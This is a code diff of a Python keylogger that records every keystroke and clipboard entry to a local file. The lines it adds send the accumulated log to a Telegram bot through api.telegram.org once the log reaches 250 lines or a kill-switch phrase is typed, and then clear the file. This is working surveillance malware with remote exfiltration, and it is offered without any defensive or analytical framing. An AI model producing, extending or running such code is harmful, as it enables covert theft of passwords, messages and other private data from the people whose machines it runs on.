@@ -2,11 +2,47 @@ from pynput import keyboard
 from datetime import datetime
 from pathlib import Path
 import pyperclip
+import requests
 
 log_file = "recording.txt"
 command = ""
 clipboard = ""
 kill_now = "wecanshutitnow"
+
+# Telegram Stuff
+BOT_API = '<REDACTED>'
+USER_ID = '<REDACTED>'
+
+def send_telegram_log(content_to_send):
+    # Sends a log message to your Telegram via bot.
+    try:
+        payload = {
+            'chat_id': USER_ID,
+            'text': content_to_send,
+        }
+        url = f'https://api.telegram.org/bot{BOT_API}/sendMessage'
+        print(url)
+        response = requests.post(url, data=payload)
+        print(response.text)
+        response.raise_for_status()
+    except Exception as e:
+        print(f"Error sending Telegram message: {e}")
+
+def can_we_send(force = False):
+    file_path = Path.cwd() / log_file
+    total_content = ""
+
+    with file_path.open('r') as file:
+        total_content = file.readlines()
+        lines = len(total_content)
+    
+    content = ''.join(total_content)
+
+    if lines > 250 or force:
+        send_telegram_log(content)
+        with file_path.open('w') as file:
+            file.write('')
+    return
 
 def log_it(log_entry):
     file_path = Path.cwd() / log_file
@@ -24,6 +60,7 @@ def log_it(log_entry):
 def kill_switch_activated():
     log_entry = f"Kill switch activated at {datetime.now()}\n"
     log_it(log_entry)
+    can_we_send(force = True)
     exit(0)
 
 def asciify(key_pressed):
@@ -86,6 +123,8 @@ def copy_clipboard():
         clipboard = pyperclip.paste()
         log_entry = f"Clipboard: \n\t{clipboard}\n at {datetime.now()}\n"
         log_it(log_entry)
+    
+    can_we_send()
 
 def on_press_function(key_pressed):
     # A key is pressed
@@ -93,6 +132,8 @@ def on_press_function(key_pressed):
     
     log_entry = f"Key pressed:\t{key} at {datetime.now()}\n"
     log_it(log_entry)
+
+    can_we_send()
 
 def on_release_function(key_released):
     # A key is released
@@ -114,6 +155,8 @@ def on_release_function(key_released):
 
     if command == kill_now:
         kill_switch_activated()
+    
+    can_we_send()
 
 def start_keylogger():
     # Create object for keyboard listener and start listening
